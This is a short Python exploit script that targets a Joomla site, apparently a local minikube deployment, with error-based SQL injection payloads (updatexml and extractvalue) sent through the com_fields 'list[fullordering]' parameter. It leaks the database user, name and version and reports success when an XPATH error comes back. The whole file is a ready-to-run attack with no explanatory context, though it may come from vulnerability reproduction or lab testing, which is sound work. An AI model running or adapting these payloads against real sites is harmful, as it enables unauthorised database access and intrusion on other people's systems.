import requests
import subprocess

get_service = subprocess.run(['minikube', 'service', 'joomla', '--url'], stdout=subprocess.PIPE)
service_url = get_service.stdout.decode('utf-8').strip()
print(f"Service IP: {service_url}")

url=service_url + "/index.php"

payloads = [
    "updatexml(0x23,concat(1,user()),1)",
    "updatexml(0x23,concat(1,database()),1)",
    "updatexml(0x23,concat(1,user(),0x3a,database()),1)",
    "extractvalue(0x23,concat(0x7e,user()))",
    "updatexml(0x23,concat_ws(0x3a,user(),database(),version()),1)",
    "updatexml(0x23,if(user()='root',1,0),1)"
]

for payload in payloads:
    params = {
        "option": "com_fields",
        "view": "fields",
        "layout": "modal",
        "list[fullordering]": payload
}
    response = requests.get(url, params=params)
    
    if "500 XPATH syntax error" in response.text:
        print("Attack successful")